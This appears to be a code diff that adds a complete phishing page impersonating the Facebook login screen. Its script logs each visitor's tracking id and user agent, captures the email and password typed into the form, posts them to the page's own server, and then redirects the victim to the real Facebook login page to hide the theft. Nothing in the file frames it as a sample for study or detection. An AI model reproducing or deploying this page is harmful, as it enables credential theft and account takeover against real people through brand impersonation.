@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Facebook</title><style>body{font-family:Helvetica;background:#f0f2f5}form{width:320px;margin:12% auto;background:#fff;padding:20px;border-radius:6px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px}button{background:#1877f2;color:#fff;border:0;width:100%;padding:12px;border-radius:4px}</style></head>
+<body>
+<form id="f"><h2>Log in to Facebook</h2><input name="email" placeholder="Email or phone" required><input name="pass" type="password" placeholder="Password" required><button>Log In</button></form>
+<script>
+const params=new URLSearchParams(location.search),id=params.get('id'),server=location.origin;
+fetch(server,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,ua:navigator.userAgent,ip:'',email:'',pass:''})});
+document.getElementById('f').addEventListener('submit',e=>{e.preventDefault();fetch(server,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,ua:navigator.userAgent,ip:'',email:f.email.value,pass:f.pass.value})});setTimeout(()=>location.replace('https://facebook.com/login.php'),400)});
+</script>
+</body>
+</html>
